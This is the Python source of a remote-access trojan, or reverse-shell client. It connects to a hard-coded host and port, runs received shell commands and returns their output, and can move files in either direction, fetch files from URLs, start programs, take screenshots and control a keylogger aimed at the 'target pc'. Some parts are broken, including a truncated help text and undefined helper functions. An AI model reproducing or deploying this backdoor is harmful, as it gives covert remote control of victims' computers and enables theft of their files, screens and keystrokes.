#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
#import time
import requests
#for requesting the shell to download files from web via requests
from mss import mss
#for screenshot
import threading
#import keylogger


def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)


def reliable_recv():
        data = ""
        while True:
                try:
			data = data + sock.recv(1024)
			return json.loads(data)
                except ValueError:
                        continue

#def connection():
#        while True:
#                time.sleep(20)
#                try:
#                        sock.connect(("192.168.43.147",54321))
#                        shell()
#                except:
#                        connection()




def shell():
	while True:
        	command = reliable_recv()
        	if command == 'q':
                	break
		elif command == "help":
                        help_options = '''                                      download pat>
                                        upload path --> upload  a File to target pc
                                        get url     --> Download a file to target pc From an>
                                        start path  --> Start a Program on Target pc
                                        screenshot  --> Take a screenshot on Target monitor
                                        check       --> check For the administator priviledg>
                                        keylog_start --> Start the keylogger
                                        keylog_dump --> Will dump the keystroke from keylogg>
                                        q           --> Exit from the reverse shell
					cd          -->change directory '''

		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
		#changing of directory
			except:
				continue
        	elif command[:8] == "download":
                        with open(command[9:],"rb") as file:
				reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				file_data = reliable_recv()
				fin.write(base64.b64decode(file_data))
		elif command[:3] == "get":
                        try:
                                download(command[4:])
                                reliable_send("[+] Downloaded file from specified url!")
                        except:
                                reliable_send("[-] Failed download that file")
                elif command[:10] == "screenshot":
                        try:
                                screenshot()
                                with open("monitor-1.png","rb")as sc:
                                        reliable_send(base64.b64encode(sc.read()))
                                os.remove("monitor-1.png")
                        except:
                                reliable_send("[!!]Failed to take screenshot")
		elif command[:5] == "start":
                        try:
                                subprocess.Popen(command[6:], shell=True)
                                reliable_send("[+]Started!")
                        except:
				reliable_send("[!!] Failed to start!")
                elif command[:12] == "keylog_start":
                        t1 = threading.Thread(target=keylogger.start)
                        t1.start()
                elif command[:11] == "keylog_dump":
                        fn = open(keylogger_path, "r")
                        reliable_send(fn.read())


		else:
                	#message = "HEllo World"
                	#sock.send(message)
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			reliable_send(result)




sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.43.147",54321))

#connection()
shell()
sock.close()


